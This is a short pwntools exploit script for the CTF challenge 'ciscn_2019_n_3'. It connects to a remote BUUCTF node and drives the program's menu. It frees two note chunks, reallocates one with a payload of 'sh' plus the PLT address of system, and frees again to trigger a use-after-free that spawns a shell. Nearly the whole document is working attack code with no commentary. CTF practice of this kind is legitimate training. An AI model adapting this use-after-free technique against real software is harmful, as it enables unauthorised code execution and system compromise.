from pwn import *

p = remote("node4.buuoj.cn",27232)
elf = ELF("./ciscn_2019_n_3")

def create(id,type,content,length=0):
	p.recvuntil("> ")
	p.sendline('1')
	p.recvuntil("> ")
	p.sendline(str(id))
	p.recvuntil("> ")
	if(type==1):
		p.sendline(str(type))
		p.recvuntil("> ")
		p.sendline(str(content))
	else:
		p.sendline(str(type))
		p.recvuntil("> ")
		p.sendline(str(length))
		p.recvuntil("> ")
		p.send(content)
def free(id):
	p.recvuntil("> ")
	p.sendline('2')
	p.recvuntil("> ")
	p.sendline(str(id))
def show(id):
	p.recvuntil("> ")
	p.sendline('3')
	p.recvuntil("> ")
	p.sendline(str(id))

create(0,1,1)
create(1,1,1)
create(2,1,1)

free(0)
free(1)

payload = b'sh\x00\x00' + p32(elf.plt['system']) + b'\n'
create(3,2,payload,0xc)


# gdb.attach(p,"b *0x08048934")
free(0)


p.interactive()
